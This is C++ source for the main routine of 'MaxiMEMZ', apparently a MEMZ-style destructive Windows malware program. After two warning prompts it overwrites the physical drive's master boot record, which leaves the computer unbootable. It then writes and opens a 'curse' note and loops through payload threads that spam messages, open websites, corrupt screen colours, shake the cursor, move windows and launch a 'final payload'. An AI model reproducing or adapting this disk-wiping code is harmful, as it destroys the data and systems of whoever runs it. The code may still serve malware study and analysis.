#include "maximemz.hpp"

INT CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpwCmdLine, INT nCmdShow) {
	if (MessageBoxW(NULL, L"This program can destroy your computer\nWanna proceed?", L"MaxiMEMZ.exe", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES)
		return 0x00;

	if (MessageBoxW(NULL, L"LAST CHANCE\nCHOOSE WISELY...", L"MaxiMEMZ.exe", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES)
		return 0x00;

	DWORD dwBytes;

	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	WriteFile(hDisk, cMBRData, cstMBRLength, &dwBytes, NULL);
	CloseHandle(hDisk);

	HANDLE hNote = CreateFileW(L"\\Maxi curse.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hNote, cMessage, cstMessageLength, &dwBytes, NULL);
	CloseHandle(hNote);

	// Use ShellExecute to open the note in Notepad //
	ShellExecuteW(NULL, NULL, L"notepad", L"\\Maxi curse.txt", NULL, SW_SHOWDEFAULT);
	Sleep(20000);

	while (TRUE) { 
		HANDLE hWebsites = CreateThread(NULL, 0, OpenWebsites, 0, NULL, NULL);
		Sleep(30000);
		HANDLE hMessageSpam = CreateThread(NULL, 0, MessageSpamThread, 0, NULL, NULL);
		Sleep(30000);

		HANDLE hSystemSounds = CreateThread(NULL, 0, PlaySystemSounds, 0, NULL, NULL);
		Sleep(20000);
		HANDLE hColorRadius = CreateThread(NULL, 0, ColorRadius, 0, NULL, NULL);
		Sleep(30000);

		HANDLE hShakeCursor = CreateThread(NULL, 0, ShakeCursor, 0, NULL, NULL);
		HANDLE hMaxiCursor = CreateThread(NULL, 0, MaxiCursor, 0, NULL, NULL);
		Sleep(30000);
		HANDLE hMessColors = CreateThread(NULL, 0, MessColors, 0, NULL, NULL);
		Sleep(23000);

		HANDLE hMessWindows = CreateThread(NULL, 0, WindowMoveThread, 0, NULL, NULL);
		Sleep(60000);
		HANDLE hJernIconSpam = CreateThread(NULL, 0, JernIconSpam, 0, NULL, NULL);
		Sleep(10000);

		HANDLE hPIP = CreateThread(NULL, 0, TunnelEffect, 0, NULL, NULL);
		Sleep(20000);
		HANDLE hLAST = CreateThread(NULL, 0, ActivateFinalPayload, 0, NULL, NULL);
		Sleep(INFINITE);
	}

	Sleep(INFINITE);
}